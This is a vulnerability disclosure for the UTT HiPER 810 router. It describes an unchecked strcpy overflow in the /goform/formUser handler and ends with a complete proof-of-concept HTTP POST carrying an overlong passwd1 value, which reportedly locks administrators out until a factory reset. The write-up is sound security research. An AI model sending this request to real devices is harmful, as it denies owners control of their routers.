# Information
Vendor of the products: UTT

Vendor's website: UTT艾泰-专业路由器、交换机、防火墙品牌

Affected products: HiPER 810

Affected firmware version: nv810v4v1.7.4-141218

Firmware download address: UTT艾泰-专业路由器、交换机、防火墙品牌

# Overview
UTT HiPER 810 router has a critical overflow vulnerability. An attacker can control the parameters by accessing the route /goform/formUser, which can cause a buffer overflow.Specifically, this can be done by "strcpy((char *)(InstPointByName + 20), Var);"Implement a denial-of-service attack.
<img width="947" height="490" alt="image" src="https://github.com/user-attachments/assets/cfc878ba-633a-41b2-a689-a44a1511e6a5" />


 
# Vulnerability details
The API for invoking the function

<img width="602" height="188" alt="image" src="https://github.com/user-attachments/assets/f4be685e-021f-46d0-ad46-2301e3780c39" />

Here the values of usernameold and username are taken, and judgments are made, and if they are both admin, enter the setSysAdm function

<img width="1237" height="660" alt="image" src="https://github.com/user-attachments/assets/f982ecb4-153a-4692-a479-8c45fbf53e3f" />

You can see that passwd1 is valued here and assigned by strcpy, and no boundary check is performed resulting in overflow

<img width="805" height="160" alt="image" src="https://github.com/user-attachments/assets/96dad529-8364-4f9e-953b-2ff6752b667b" />

<img width="861" height="437" alt="image" src="https://github.com/user-attachments/assets/a45d4479-1193-443e-91bc-1f31df0a167f" />

We click on this tab and then capture the packet to make some modifications.
<img width="1528" height="460" alt="image" src="https://github.com/user-attachments/assets/d12400d6-5b78-4602-9b35-5af01426693b" />

This data packet contains our authentication and other information.
<img width="1527" height="888" alt="image" src="https://github.com/user-attachments/assets/b12b500d-adaf-4b7e-995c-ecf28b8142c3" />

Construct the following data packet and then send it.
<img width="1524" height="859" alt="image" src="https://github.com/user-attachments/assets/7e4d05fd-5032-4f70-b856-a9e40456579e" />

When we visited the backend again, we found that it kept asking us for authentication. Clicking login didn't work, and the login prompt kept appearing endlessly.
<img width="1535" height="546" alt="image" src="https://github.com/user-attachments/assets/f27a9c14-c623-406e-a9e6-76caa7680f19" />

You must reset the router to restore it; restarting it still results in the same situation, and you cannot log in to the admin panel.


# POC
```
POST /goform/formUser HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 902
Origin: http://192.168.1.1
Authorization: Digest username="admin", realm="UTT", nonce="1fa2657e2d43a77cef41dcd33243b6a7", uri="/User_edit.asp", algorithm=MD5, response="b7e42c3ea2f51d81bf1a538803455f74", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=000003ca, cnonce="f85ef072c87c35c8"
Connection: keep-alive
Referer: http://192.168.1.1/User.asp
Cookie: utt_bw_rdevType=; utt_bw_rtab=WAN1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

usernameold=admin&username=admin&passwd1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

```



